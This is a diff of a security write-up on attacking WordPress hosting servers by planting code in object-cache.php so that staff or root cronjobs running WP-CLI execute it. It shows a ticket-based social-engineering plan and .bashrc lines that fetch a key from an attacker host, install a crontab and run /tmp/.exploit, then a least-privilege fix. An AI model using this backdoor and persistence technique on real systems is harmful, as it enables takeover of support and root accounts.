@@ -1,5 +1,6 @@
 # Attacking hosting webservers through WP-CLI
 
+## WP-CLI
 WP-CLI[1] is the command-line interface for WordPress, as their site claims. It gives an interface to functionality of WordPress. This is quite cool and is used by a lot of (WordPress) hosting companies to troubleshoot and support their customers. 
 
 An example:
@@ -41,6 +42,7 @@ In the above example we see that adding just a exclamation mark would result in 
 
 As an extra security layer most hosting companies might choose to disable the execution of PHP system commands and process calls. This makes it a lot harder for attackers. As they might have gotten access to the WordPress installation, they cannot call system commands. So what to do when you have access to a WordPress installation and want to escalate privileges to someone with more than just a sandboxed PHP proces?
 
+## WordPress Object Caching
 This is where object caching comes in. Persistent object caching is a caching strategy that stores PHP objects (for example arrays) on disk or in memory. When another request is done instead of sending the same database queries it gets the object from the cache. This can speed up the requested sites that do a lot of database queries.
 
 In WordPress this can be enabled through the optional wp-content/object-cache.php file. This file is intended for caching plugins to provide persistent object caching for WordPress objects. This file is not part of WordPress core but is loaded on startup if it exists by wp-includes/load.php:
@@ -92,6 +94,7 @@ Success: WordPress install verifies against checksums.
 
 In the above example we inject `<?php echo "hi there\n"; ?>` into object-cache.php. The next time we run `wp-cli.phar` it is executed. 
 
+## The attack
 For attacking this we setup an imaginary hosting environment:
 - Linux server
 - Whatever webserver, SQL server etc you wish
@@ -100,13 +103,16 @@ For attacking this we setup an imaginary hosting environment:
 	- proc functions (proc_open, proc_terminate, proc_close, proc_get_status, proc_nice)
 	- posix functions (posix_kill, posix_mkfifo, posix_setpgid, posix_setsid, posix_setuid, posix_getpwuid, posix_uname)
 	- other vulnerable function (popen, pclose, system, show_source, dl, shell_exec, passthru)
-*These are not disabled by default, but any sane hosting company would disable these.*
 
-So when a page is requested via the webserver PHP-FPM executes the WordPress installation as `webuser`. The output of the process is then served to the requestor. In this context the configuration of the server provides some security and is bound to the webroot of the site. 
+**These are not disabled by default, but any sane hosting company would disable these.**
 
-When a local system user (ie. sysadmins, support, client connecting via ssh, cronjobs) execute wp-cli.phar it is executing in context of that user. So the PHP process runs as the user executing it... think about that. This is where we have a way to attack the system.
+So when a page is requested via the webserver PHP-FPM executes the WordPress installation as `webuser`. It looks up any objects in cache as is needed and extends the data with new queries to the database. The output of the process is then served to the requestor. In this context the configuration of the server provides some security and is bound to the open_basedir or docroot of the site. 
 
-Let's inject the following into `wp-content/object-cache.php`. Read the comment in the code to see what it does:
+When a local system user (ie. sysadmins, support, client connecting via ssh, cronjobs) execute wp-cli.phar it is executing in context of that user. So the PHP process runs as the user executing it. It is the way linux and most other operating systems work. The program is run in context of the user if not specified otherwise. This is where we have a way to attack the system.
+
+Let's assume we have control over a WordPress site hosted by hostingcompany X. This can be because we payed them to or someone else did and we took over their WordPress. Hostingcompany X has this superrad employee supportdeskcalled Patrick. Why, Patrick you ask, well just because they do. 
+
+Let's inject the following into `wp-content/object-cache.php` on this WordPress install. Read the comment in the code to see what it does:
 ```
 <?php    
 	@$uid = posix_getuid();
@@ -165,7 +171,7 @@ Let's inject the following into `wp-content/object-cache.php`. Read the comment 
 ?>
 ```
 
-So now we contact customer support and say that we cannot upgrade a plugin. When the support engineer executes wp-cli.phar the code in object-cache.php would be executed with their privileges. To be safe they use the `--skip-themes` and `--skip-plugins` arguments. They would see the following:
+After we injected this into the site we send hostingcompany X a ticket that we cannot update some of our plugins. Patrick gets our ticket assigned, logs into the server over SSH and runs `wp-cli.phar` to see what plugins have updates available. He adds the `--skip-themes` and `--skip-plugins` arguments to be on the safe side. THis is what he would see:
 ```
 $ wp-cli.phar plugin list --skip-plugins --skip-themes
 +-------------------------------+----------+--------+---------+
@@ -178,38 +184,39 @@ $ wp-cli.phar plugin list --skip-plugins --skip-themes
 +-------------------------------+----------+--------+---------+
 ```
 
-So, we see nothing at all, but in the meantime on EVILDOMAIN's webserver we see the following in the logs:
-
+He sees nothing at all of importance. No hack, no out of date plugins. Nothing of importance. Meanwhile on EVILDOMAIN's webserver we see the following in the logs:
 ```
 root@EVILDOMAIN:/var/log/apache2/# tail -f access.log 
 xxx.xx.xxx.xx - - [04/Jul/2017 14:55:55] "GET /sshkey.pub HTTP/1.1" 200 -
 xxx.xx.xxx.xx - - [04/Jul/2017 14:55:58] "GET /sskey.pub HTTP/1.1" 200 -
 xxx.xx.xxx.xx - - [04/Jul/2017 14:55:58] "GET /exploit HTTP/1.1" 200 -
-xxx.xx.xxx.xx - - [04/Jul/2017 14:55:58] "GET /?xxxxx@xxxx.xxxx.com HTTP/1.1" 200 -
+xxx.xx.xxx.xx - - [04/Jul/2017 14:55:58] "GET /?patrick@xxxx.xxxx.com HTTP/1.1" 200 -
 ```
 
-On the hosting machine a quick look at the support engineers `.bashrc`:
+On the hosting machine a quick look at Patricks `.bashrc`:
 ```
 $ tail -n 3 ~/.bashrc 
-curl -s http://EVILDOMAIN/sshkey.pub?xxxx@xxxx.xxxx.com -o /tmp/.sshkey.pub 2>&1 > /dev/null;
+curl -s http://EVILDOMAIN/sshkey.pub?patrick@xxxx.xxxx.com -o /tmp/.sshkey.pub 2>&1 > /dev/null;
 crontab /tmp/.cronfile 2>&1 > /dev/null;
-/tmp/.exploit
+/tmp/.exploit 
 ```
 
-If this user logs into the system again the user executes the above. It adds the cronjob and the exploit is executed as the support engineer. Maybe the hoster automates updates for you with the following cronjob running as root:
+If Patrick logs into the system once again he will execute lines in his bashrc before he sees a prompt. It adds the cronjob and the exploit is executed as the user Patrick. Maybe Patrick has passwordless sudo, maybe he doesn't. As it stands we now as an attacker have the same abilities as Patrick. This is a problem and not just Patrick's. We have an account on the system that can examine user databases, view configs and maybe even change some data.
+
+In some rare cases it might be so that we don't need Patrick. Might be so that hostingcompany X implement automatic updates of WordPress for you with a cronjob. These cronjobs might even be running as root:
 ```
 * 0 * * * wp-cli.phar --allow-root core update && chown -R webuser:webuser httpdocs/
 ```
-This would give us code execution as root on the webserver!
+This would give us code execution as root on the webserver, imagine the damage that we could do.
 
-Solving this issue is easy. Always use the concept of least privilege. If you force the use of the non-privileged webuser misuse wil be prevented:
+While this problem might be quite serious the problem lies not with WP-CLI or even WordPress. The problem is that the hostingcompany doesn't understand what they are running. Using WP-CLI makes life very easy for WordPress Hosters, but you need to understand what this application does under the hood. The solution to this issue is fairly easy. Always use the concept of least privilege. If you force the use of the non-privileged webuser all problems will be containt to the rights this user has. This can be done with the `sudo` command. Yes, it has uses other than `sudo su` and `sudo make me a sandwich`:
 ```
 $ sudo -u webuser wp-cli.phar plugin list
 ```
-This will prevent the executed code to do anything on the account which is executing the code.
+
+This will executed all code within the application to priviliges you granted to webuser (which will be very limited).
 
 If you have any comments, suggestions or want to get in touch:  *_@sp2.io*
-
 
 Links: 
 - [1] http://wp-cli.org/
